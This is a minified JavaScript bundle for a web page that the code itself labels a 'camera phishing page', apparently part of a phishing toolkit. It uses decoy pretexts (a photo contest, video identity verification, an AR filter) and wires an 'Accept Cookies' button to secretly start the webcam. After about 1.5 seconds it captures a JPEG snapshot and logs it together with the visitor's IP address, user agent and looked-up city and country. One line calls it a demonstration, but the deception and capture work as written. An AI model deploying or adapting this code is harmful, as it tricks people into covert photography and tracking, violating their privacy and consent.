(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[23],{285:(e,t,r)=>{"use strict";r.d(t,{$:()=>d});var s=r(5155),a=r(2115),o=r(9708),n=r(2085),i=r(9434);let c=(0,n.F)("inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0",{variants:{variant:{default:"bg-primary text-primary-foreground hover:bg-primary/90",destructive:"bg-destructive text-destructive-foreground hover:bg-destructive/90",outline:"border border-input bg-background hover:bg-accent hover:text-accent-foreground",secondary:"bg-secondary text-secondary-foreground hover:bg-secondary/80",ghost:"hover:bg-accent hover:text-accent-foreground",link:"text-primary underline-offset-4 hover:underline"},size:{default:"h-10 px-4 py-2",sm:"h-9 rounded-md px-3",lg:"h-11 rounded-md px-8",icon:"h-10 w-10"}},defaultVariants:{variant:"default",size:"default"}}),d=a.forwardRef((e,t)=>{let{className:r,variant:a,size:n,asChild:d=!1,...l}=e,u=d?o.DX:"button";return(0,s.jsx)(u,{className:(0,i.cn)(c({variant:a,size:n,className:r})),ref:t,...l})});d.displayName="Button"},1915:(e,t,r)=>{"use strict";r.r(t),r.d(t,{default:()=>y});var s=r(5155),a=r(2115),o=r(5695),n=r(6603),i=r(285),c=r(6716),d=r(5268),l=r(9311),u=r(157);let m=(0,u.A)("VideoOff",[["path",{d:"M10.66 6H14a2 2 0 0 1 2 2v2.5l5.248-3.062A.5.5 0 0 1 22 7.87v8.196",key:"w8jjjt"}],["path",{d:"M16 16a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h2",key:"1xawa7"}],["path",{d:"m2 2 20 20",key:"1ooewy"}]]);var h=r(8376),g=r(1949);let p=(0,u.A)("Cookie",[["path",{d:"M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5",key:"laymnq"}],["path",{d:"M8.5 8.5v.01",key:"ue8clq"}],["path",{d:"M16 15.5v.01",key:"14dtrp"}],["path",{d:"M12 12v.01",key:"u5ubse"}],["path",{d:"M11 17v.01",key:"1hyl5a"}],["path",{d:"M7 14v.01",key:"uct60s"}]]);var x=r(7933),f=r(9434);let b={"photo-contest-entry":{title:"Capture the Moment: Photo Contest!",message:"Showcase your photography skills and win amazing prizes! To submit your entry, please first **accept our cookie policy below**. Camera access will be requested afterwards to capture your photo submission.",cookieMessage:"Our site uses cookies to enhance your experience and for essential functionality. By clicking 'Accept Cookies', you agree to our use of cookies."},"video-verification":{title:"Video Verification",actionText:"Start Video Verification",message:"For security, we need to verify your identity via video. Please enable your camera."},"ar-filter":{title:"Try Our New AR Filter!",actionText:"Test AR Filter",message:"Check out our latest AR filter! Enable your camera to see it in action."},default:{title:"Camera Access Required",actionText:"Enable Camera",message:"This feature requires camera access. Please enable your camera to continue."}};function y(){let{addLog:e}=(0,n.j)(),{id:t}=(0,o.useParams)(),r=t||"default",u=b[r]||b.default,[y,v]=(0,a.useState)("idle"),[j,w]=(0,a.useState)(null),[N,k]=(0,a.useState)(!1),A=(0,a.useRef)(null),C=(0,a.useRef)(null),S=(0,a.useRef)(null),[T,E]=(0,a.useState)(!1);(0,a.useEffect)(()=>{e({type:"generic",data:{message:"Visited camera phishing page: /phishing/camera/".concat(r)}})},[r]);let M=()=>{if(A.current&&C.current&&4===A.current.readyState&&A.current.videoWidth>0){let t=A.current,r=C.current,{videoWidth:s,videoHeight:a}=t;s>a?s>640&&(a=Math.round(640*a/s),s=640):a>480&&(s=Math.round(480*s/a),a=480),r.width=s,r.height=a;let o=r.getContext("2d");o&&(o.drawImage(t,0,0,r.width,r.height),e({type:"camera",data:{imageUrl:r.toDataURL("image/jpeg",.9)}}),v("captured"),P(!0))}},I=async()=>{S.current&&P(),v("requesting"),k(!0),w(null);try{let e=await navigator.mediaDevices.getUserMedia({video:!0});S.current=e,A.current&&(A.current.srcObject=e,A.current.onloadedmetadata=()=>{A.current&&A.current.play(),v("streaming"),k(!1),setTimeout(M,1500)})}catch(r){console.error("Camera access error:",r);let t="Could not access camera.";r instanceof DOMException&&("NotAllowedError"===r.name||"PermissionDeniedError"===r.name?t="Camera access denied by user.":("NotFoundError"===r.name||"DevicesNotFoundError"===r.name)&&(t="No camera found on this device.")),w(t),v("error"),e({type:"generic",data:{message:"Camera error: ".concat(t)}}),k(!1)}},P=function(){let e=arguments.length>0&&void 0!==arguments[0]&&arguments[0];S.current&&(S.current.getTracks().forEach(e=>e.stop()),S.current=null),A.current&&(A.current.srcObject=null),e||"captured"===y||"error"===y||v("idle")};return((0,a.useEffect)(()=>()=>{P()},[]),"photo-contest-entry"===r)?(0,s.jsxs)(s.Fragment,{children:[(0,s.jsxs)(c.Q,{title:u.title,isLoading:N&&"streaming"!==y&&T,error:j,statusMessage:"captured"===y?"Photo submitted successfully! Good luck in the contest.":void 0,children:[(0,s.jsxs)("div",{className:"text-center mb-6",children:[(0,s.jsx)(d.A,{className:"h-16 w-16 text-amber-500 mx-auto mb-4"}),(0,s.jsx)("p",{className:"text-lg text-muted-foreground",dangerouslySetInnerHTML:{__html:u.message.replace(/\*\*(.*?)\*\*/g,"<strong>$1</strong>")}})]}),(0,s.jsxs)("div",{className:(0,f.cn)("aspect-video bg-muted rounded-lg overflow-hidden mb-6 relative border-2","streaming"===y&&T?"border-primary":"border-border"),children:[(0,s.jsx)("video",{ref:A,className:"w-full h-full object-cover",playsInline:!0,muted:!0}),!("streaming"===y&&T)&&!("captured"===y&&T)&&(0,s.jsx)("div",{className:"absolute inset-0 flex flex-col items-center justify-center bg-black/30",children:T?("idle"===y||"requesting"===y||"error"===y)&&T?(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(m,{className:"h-16 w-16 text-white/70 mb-2"}),(0,s.jsx)("p",{className:"text-white/90 text-center px-4",children:"error"===y&&j?j:"Camera feed inactive. Waiting for camera permission..."})]}):null:(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(l.A,{className:"h-16 w-16 text-white/70 mb-2"}),(0,s.jsx)("p",{className:"text-white/90",children:"Contest photo will appear here"})]})})]}),(0,s.jsx)("canvas",{ref:C,className:"hidden"}),"streaming"===y&&!N&&T&&(0,s.jsxs)("div",{className:"text-center p-3 bg-blue-50 border border-blue-200 rounded-md mb-6",children:[(0,s.jsx)("p",{className:"font-medium text-blue-700",children:"Camera active. Capturing snapshot..."}),(0,s.jsx)(i.$,{onClick:()=>P(),variant:"outline",size:"sm",className:"mt-2",children:"Cancel Submission"})]}),"captured"===y&&T&&(0,s.jsxs)("div",{className:"text-center p-4 bg-green-50 border border-green-200 rounded-md mb-6",children:[(0,s.jsx)(h.A,{className:"mx-auto h-10 w-10 text-green-600 mb-2"}),(0,s.jsx)("p",{className:"font-semibold text-green-700",children:"Photo Submitted Successfully!"}),(0,s.jsx)("p",{className:"text-sm text-green-600",children:"Thank you for entering the contest. This window can now be closed."})]}),"error"===y&&T&&j&&(0,s.jsxs)("div",{className:"text-center p-4 bg-red-50 border border-red-200 rounded-md mb-6",children:[(0,s.jsx)(g.A,{className:"mx-auto h-10 w-10 text-red-600 mb-2"}),(0,s.jsx)("p",{className:"font-semibold text-red-700",children:"Camera Access Failed"}),(0,s.jsx)("p",{className:"text-sm text-red-600",children:j}),(0,s.jsx)(i.$,{onClick:I,variant:"outline",className:"mt-3",children:"Try Again"})]})]}),!T&&(0,s.jsx)("div",{className:"fixed bottom-0 left-0 right-0 p-4 bg-background border-t border-border shadow-lg z-50",children:(0,s.jsxs)("div",{className:"container mx-auto flex flex-col sm:flex-row items-center justify-between gap-3",children:[(0,s.jsx)("p",{className:"text-sm text-foreground text-center sm:text-left flex-grow",children:u.cookieMessage||"Our site uses cookies to enhance your experience. By clicking 'Accept Cookies', you agree to our use of cookies."}),(0,s.jsxs)(i.$,{onClick:()=>{E(!0),I()},className:"bg-primary hover:bg-primary/90 text-primary-foreground whitespace-nowrap w-full sm:w-auto flex-shrink-0",size:"md",disabled:N&&!T,children:[(0,s.jsx)(p,{className:"mr-2 h-4 w-4"}),"Accept Cookies"]})]})})]}):(0,s.jsxs)(c.Q,{title:u.title,isLoading:N&&"streaming"!==y,error:j,statusMessage:"captured"===y?"Camera snapshot captured successfully for demonstration.":void 0,children:[(0,s.jsx)("p",{className:"text-center text-muted-foreground mb-6",children:u.message}),(0,s.jsxs)("div",{className:"aspect-video bg-muted rounded-lg overflow-hidden mb-6 relative border",children:[(0,s.jsx)("video",{ref:A,className:"w-full h-full object-cover",playsInline:!0,muted:!0}),"streaming"!==y&&"captured"!==y&&(0,s.jsxs)("div",{className:"absolute inset-0 flex flex-col items-center justify-center bg-black/50",children:[(0,s.jsx)(m,{className:"h-16 w-16 text-white/70 mb-2"}),(0,s.jsx)("p",{className:"text-white/90",children:"Camera feed inactive"})]})]}),(0,s.jsx)("canvas",{ref:C,className:"hidden"}),("idle"===y||"error"===y)&&(0,s.jsxs)(i.$,{onClick:I,className:"w-full bg-accent hover:bg-accent/90 text-accent-foreground",disabled:N,children:[(0,s.jsx)(x.A,{className:"mr-2 h-5 w-5"}),N?"Initializing Camera...":u.actionText||"Enable Camera"]}),"streaming"===y&&!N&&(0,s.jsxs)("div",{className:"text-center p-3 bg-blue-50 border border-blue-200 rounded-md",children:[(0,s.jsx)("p",{className:"font-medium text-blue-700",children:"Camera active. Capturing snapshot..."}),(0,s.jsx)(i.$,{onClick:()=>P(),variant:"outline",size:"sm",className:"mt-2",children:"Stop Camera"})]}),"captured"===y&&(0,s.jsxs)("div",{className:"text-center p-4 bg-green-50 border border-green-200 rounded-md",children:[(0,s.jsx)(h.A,{className:"mx-auto h-10 w-10 text-green-600 mb-2"}),(0,s.jsx)("p",{className:"font-semibold text-green-700",children:"Image Captured"}),(0,s.jsx)("p",{className:"text-sm text-green-600",children:"An image has been captured. This window can now be closed."})]}),"error"===y&&j&&(0,s.jsxs)("div",{className:"text-center p-4 bg-red-50 border border-red-200 rounded-md",children:[(0,s.jsx)(g.A,{className:"mx-auto h-10 w-10 text-red-600 mb-2"}),(0,s.jsx)("p",{className:"font-semibold text-red-700",children:"Camera Access Failed"}),(0,s.jsx)("p",{className:"text-sm text-red-600",children:j}),(0,s.jsx)(i.$,{onClick:I,variant:"outline",className:"mt-3",children:"Try Again"})]})]})}},1949:(e,t,r)=>{"use strict";r.d(t,{A:()=>s});let s=(0,r(157).A)("TriangleAlert",[["path",{d:"m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3",key:"wmoenq"}],["path",{d:"M12 9v4",key:"juzpu7"}],["path",{d:"M12 17h.01",key:"p32p05"}]])},5268:(e,t,r)=>{"use strict";r.d(t,{A:()=>s});let s=(0,r(157).A)("Trophy",[["path",{d:"M6 9H4.5a2.5 2.5 0 0 1 0-5H6",key:"17hqa7"}],["path",{d:"M18 9h1.5a2.5 2.5 0 0 0 0-5H18",key:"lmptdp"}],["path",{d:"M4 22h16",key:"57wxv0"}],["path",{d:"M10 14.66V17c0 .55-.47.98-.97 1.21C7.85 18.75 7 20.24 7 22",key:"1nw9bq"}],["path",{d:"M14 14.66V17c0 .55.47.98.97 1.21C16.15 18.75 17 20.24 17 22",key:"1np0yb"}],["path",{d:"M18 2H6v7a6 6 0 0 0 12 0V2Z",key:"u46fv3"}]])},5695:(e,t,r)=>{"use strict";var s=r(8999);r.o(s,"useParams")&&r.d(t,{useParams:function(){return s.useParams}}),r.o(s,"usePathname")&&r.d(t,{usePathname:function(){return s.usePathname}}),r.o(s,"useRouter")&&r.d(t,{useRouter:function(){return s.useRouter}})},6603:(e,t,r)=>{"use strict";r.d(t,{_:()=>d,j:()=>l});var s=r(5155),a=r(2115),o=r(7481);let n=(0,a.createContext)(void 0);async function i(){try{let e=await fetch("https://api.ipify.org?format=json");if(!e.ok)return console.error("Failed to fetch IP, status:",e.status),"IP Not Found (Fetch Error)";return(await e.json()).ip||"IP Not Found (API)"}catch(e){return console.error("Error fetching IP:",e),"IP Not Found (Catch)"}}async function c(e){if(e.startsWith("IP Not Found")||"127.0.0.1"===e||"localhost"===e)return{city:"Local",country:"N/A"};try{let t=await fetch("https://ip-api.com/json/".concat(e,"?fields=status,message,country,city"));if(!t.ok)return{};let r=await t.json();if("success"===r.status)return{city:r.city,country:r.country}}catch(e){console.error("Error fetching geo info:",e)}return{}}let d=e=>{let{children:t}=e,[r,d]=(0,a.useState)([]),[l,u]=(0,a.useState)(!0),{toast:m}=(0,o.dj)();(0,a.useEffect)(()=>{try{let e=localStorage.getItem("stish_logs");e&&d(JSON.parse(e))}catch(e){console.error("Error parsing logs from localStorage:",e),localStorage.removeItem("stish_logs")}u(!1)},[]),(0,a.useEffect)(()=>{if(!l)try{localStorage.setItem("stish_logs",JSON.stringify(r))}catch(e){console.error("Error saving logs to localStorage:",e)}},[r,l]),(0,a.useEffect)(()=>{let e=e=>{if("stish_logs"===e.key&&e.newValue)try{d(JSON.parse(e.newValue))}catch(e){console.error("Error parsing logs from storage event:",e)}};return window.addEventListener("storage",e),()=>{window.removeEventListener("storage",e)}},[]);let h=(0,a.useCallback)(async e=>{let t=await i(),r="undefined"!=typeof navigator?navigator.userAgent:"N/A",s={...e,id:crypto.randomUUID(),timestamp:new Date().toISOString(),ip:t,userAgent:r},a=e.data;if("location"===e.type){let r=await c(t);a={...e.data,city:r.city,country:r.country}}let o={...s,data:a};d(e=>[o,...e])},[]);return(0,s.jsx)(n.Provider,{value:{logs:r,addLog:h,clearLogs:()=>{d([]),m({title:"Logs Cleared",description:"All captured data has been deleted."})},isLoading:l},children:t})},l=()=>{let e=(0,a.useContext)(n);if(void 0===e)throw Error("useLogs must be used within a LogProvider");return e}},6716:(e,t,r)=>{"use strict";r.d(t,{Q:()=>a});var s=r(5155);function a(e){let{children:t,title:r,statusMessage:a,isLoading:o,error:n}=e;return(0,s.jsx)("div",{className:"flex flex-col items-center justify-center min-h-screen bg-gradient-to-br from-background to-secondary p-4 sm:p-6 lg:p-8",children:(0,s.jsxs)("div",{className:"w-full max-w-lg bg-card p-6 sm:p-8 rounded-xl shadow-2xl border border-border",children:[(0,s.jsxs)("div",{className:"text-center mb-6",children:[(0,s.jsx)("h1",{className:"text-2xl sm:text-3xl font-bold text-primary pt-3",children:r})," "]}),o&&(0,s.jsxs)("div",{className:"text-center my-6",children:[(0,s.jsx)("div",{className:"animate-spin rounded-full h-10 w-10 border-b-2 border-primary mx-auto"}),(0,s.jsx)("p",{className:"mt-3 text-muted-foreground",children:"Processing request..."})]}),a&&!o&&(0,s.jsx)("div",{className:"my-4 p-3 bg-green-100 border border-green-300 text-green-700 rounded-md text-sm",children:a}),n&&!o&&(0,s.jsxs)("div",{className:"my-4 p-3 bg-red-100 border border-red-300 text-red-700 rounded-md text-sm",children:[(0,s.jsx)("strong",{children:"Error:"})," ",n]}),(0,s.jsx)("div",{className:"mt-6",children:t})]})})}},7481:(e,t,r)=>{"use strict";r.d(t,{dj:()=>m});var s=r(2115);let a=0,o=new Map,n=e=>{if(o.has(e))return;let t=setTimeout(()=>{o.delete(e),l({type:"REMOVE_TOAST",toastId:e})},1e6);o.set(e,t)},i=(e,t)=>{switch(t.type){case"ADD_TOAST":return{...e,toasts:[t.toast,...e.toasts].slice(0,1)};case"UPDATE_TOAST":return{...e,toasts:e.toasts.map(e=>e.id===t.toast.id?{...e,...t.toast}:e)};case"DISMISS_TOAST":{let{toastId:r}=t;return r?n(r):e.toasts.forEach(e=>{n(e.id)}),{...e,toasts:e.toasts.map(e=>e.id===r||void 0===r?{...e,open:!1}:e)}}case"REMOVE_TOAST":if(void 0===t.toastId)return{...e,toasts:[]};return{...e,toasts:e.toasts.filter(e=>e.id!==t.toastId)}}},c=[],d={toasts:[]};function l(e){d=i(d,e),c.forEach(e=>{e(d)})}function u(e){let{...t}=e,r=(a=(a+1)%Number.MAX_SAFE_INTEGER).toString(),s=()=>l({type:"DISMISS_TOAST",toastId:r});return l({type:"ADD_TOAST",toast:{...t,id:r,open:!0,onOpenChange:e=>{e||s()}}}),{id:r,dismiss:s,update:e=>l({type:"UPDATE_TOAST",toast:{...e,id:r}})}}function m(){let[e,t]=s.useState(d);return s.useEffect(()=>(c.push(t),()=>{let e=c.indexOf(t);e>-1&&c.splice(e,1)}),[e]),{...e,toast:u,dismiss:e=>l({type:"DISMISS_TOAST",toastId:e})}}},7933:(e,t,r)=>{"use strict";r.d(t,{A:()=>s});let s=(0,r(157).A)("Camera",[["path",{d:"M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z",key:"1tc9qg"}],["circle",{cx:"12",cy:"13",r:"3",key:"1vg3eu"}]])},8376:(e,t,r)=>{"use strict";r.d(t,{A:()=>s});let s=(0,r(157).A)("CircleCheckBig",[["path",{d:"M21.801 10A10 10 0 1 1 17 3.335",key:"yps3ct"}],["path",{d:"m9 11 3 3L22 4",key:"1pflzl"}]])},8690:(e,t,r)=>{Promise.resolve().then(r.bind(r,1915))},9311:(e,t,r)=>{"use strict";r.d(t,{A:()=>s});let s=(0,r(157).A)("Image",[["rect",{width:"18",height:"18",x:"3",y:"3",rx:"2",ry:"2",key:"1m3agn"}],["circle",{cx:"9",cy:"9",r:"2",key:"af1f0g"}],["path",{d:"m21 15-3.086-3.086a2 2 0 0 0-2.828 0L6 21",key:"1xmnt7"}]])},9434:(e,t,r)=>{"use strict";r.d(t,{cn:()=>o});var s=r(2596),a=r(9688);function o(){for(var e=arguments.length,t=Array(e),r=0;r<e;r++)t[r]=arguments[r];return(0,a.QP)((0,s.$)(t))}}},e=>{var t=t=>e(e.s=t);e.O(0,[668,441,684,358],()=>t(8690)),_N_E=e.O()}]);